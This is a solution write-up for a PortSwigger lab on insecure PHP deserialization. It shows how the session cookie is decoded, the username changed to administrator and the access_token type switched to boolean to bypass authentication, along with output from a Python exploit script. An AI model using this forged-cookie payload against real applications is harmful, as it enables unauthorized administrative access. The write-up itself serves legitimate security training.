# Lab: Modifying serialized data types

### Instructions

This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result. To solve the lab, edit the serialized object in the session cookie to access the `administrator` account. Then, delete the user `carlos`.

You can log in to your own account using the following credentials: `wiener:peter`

### Solution

Logging in with the provided credentials a cookie is set:

```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJnenYyZW5oa2lzNWRiYnQweHB6cm13c2pkeWE3MGs5dyI7fQ%3d%3d
```

We can URL decode then Base64 decode this:

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"gzv2enhkis5dbbt0xpzrmwsjdya70k9w";}
```

We can try simply updating the username to `administrator`:

```
O:4:"User":2:{s:8:"username";s:6:"administrator";s:12:"access_token";s:32:"gzv2enhkis5dbbt0xpzrmwsjdya70k9w";}
```

Then after Base64 and URL encoding this passing it in we get an error:

```


PHP Fatal error: Uncaught Exception: unserialize() failed in /var/www/index.php:4 Stack trace: #0 {main} thrown in /var/www/index.php on line 4 
```

This fails for two reasons: 

First we did not update the char count for the username administrator (wiener=6, administrator=13).

We also see there is some type of string being assigned to the `access_token` parameter.

We can first update the administrator `s` value to 13, then we can change the `access_token` data type from string `s` to boolean `b`:

```
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";b:1;}
```

We can Base64 and URL encode this cookie, pass it in and refresh the page. This gives us access to the admin dashboard where the user carlos can be deleted to solve the lab:

```
Users
wiener - Delete
carlos - Delete
```

### Python Solution

See `deserialization_02.py`.

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/Insecure_Deserialization/Deserialization_02_modifying_serialized_data_types]
└─$ python deserialization_02.py https://0a1b00ea030d893b84ebe57600b1005c.web-security-academy.net/
[+] Logged in as wiener
[+] Original cookie content: O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"gzv2enhkis5dbbt0xpzrmwsjdya70k9w";}
[+] New cookie content: O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";b:1;}
[+] Forged admin cookie
[+] Deleted carlos
[+] Lab solved!
```